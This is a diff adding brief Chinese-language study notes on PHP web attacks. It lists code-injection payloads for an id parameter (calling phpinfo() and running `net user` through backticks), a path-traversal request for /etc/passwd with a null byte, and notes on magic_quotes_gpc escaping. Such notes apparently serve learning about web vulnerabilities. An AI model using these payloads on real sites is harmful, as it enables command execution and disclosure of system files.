@@ -1,0 +1,13 @@
+php特点;分号，分号是一句的结束
+
+php代码注释一行“//“
+
+id=ImpactFeesReport(0);phpinfo();//
+
+id=ImpactFeesReport(0) ;//;echo`net user`;//
+
+export.php?what=../../../../../../etc/passwd%00 
+
+将magic_quotes_gpc高为ON,它的作用是将单引号,双引号,反斜线,和空字符转换为含有反斜线的字符
+
+0x3a  ?是"?："的意思
